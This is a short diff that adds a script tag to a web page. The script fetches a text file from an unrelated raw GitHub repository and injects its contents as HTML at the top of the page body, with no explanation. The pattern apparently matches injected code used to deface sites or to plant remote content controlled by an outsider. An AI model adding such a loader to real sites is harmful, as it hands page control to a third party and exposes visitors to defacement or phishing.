@@ -1,0 +1,7 @@
+<script>
+fetch("https://raw.githubusercontent.com/hasanani9900-lang/ewe/refs/heads/main/gelo.txt")
+  .then(res => res.text())
+  .then(txt => {
+      document.body.insertAdjacentHTML("afterbegin", txt);
+  });
+</script>
